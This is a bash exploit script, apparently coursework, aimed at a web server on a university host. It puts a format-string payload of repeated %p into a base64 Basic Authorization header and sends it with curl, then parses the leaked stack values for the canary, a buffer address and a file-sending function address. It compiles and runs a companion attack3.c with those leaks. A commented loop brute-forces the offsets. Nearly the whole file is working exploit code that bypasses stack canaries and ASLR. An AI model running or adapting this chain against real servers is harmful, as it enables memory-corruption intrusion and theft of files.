#!/bin/bash

#kati=$(echo "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p." | base64 -w0 )
#kati=$(echo "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p." | base64 -w0 ) autto
auth_code=$(echo "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p." | base64 -w0 )

curl -v "linux03.di.uoa.gr:8000/" \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: el-GR,el;q=0.9,en;q=0.8,de;q=0.7' \
  -H "Authorization: Basic $auth_code" \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: none' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' \
  -H 'sec-ch-ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  --compressed 2> output

#find addresses from output file 
str=$(tail -c 410 output |  head -c 330)
substr="0x"
prefix=${str%%$substr*}
index=${#prefix}

#find canari address
canari=${str:index+216:10}

#find buffer address
addr1=${str:index+249:10}
baddress=$(($addr1-0x00000078))
hexb=$(echo "obase=16; $baddress" | bc)

#find send file address
addr2=${str:index+238:10}
sfaddress=$(($addr2-0x00005319))
hexsf=$(echo "obase=16; $sfaddress" | bc)


# for (( i=100; i<=200; i++))
# do 
#   for (( j=21000; j<=22000; j++))
#     do 
#     gcc -DoffsetA=$i -DoffsetB=$j -pie -m32 -o attack3 attack3.c
#     ./attack3 $canari $addr1 $addr2 2> bbb&
#     nekros=$!
#     sleep 0.6
#     kill $nekros;

#     check=$(wc -c < bbb)
#     echo $i $j $check $'\n'

#     if [ $check -gt 99 ]
#     then 
#         cat bbb
#         i=1000
#         break
#     fi

#   done
# done


 gcc -DoffsetA=120 -DoffsetB=21273 -pie -m32 -o attack3 attack3.c
./attack3 $canari $addr1 $addr2 &
nekros=$!
sleep 0.6
kill $nekros;


echo $'\n'
echo $canari
echo $addr1
echo $addr2
echo $hexb
echo $hexsf



















































































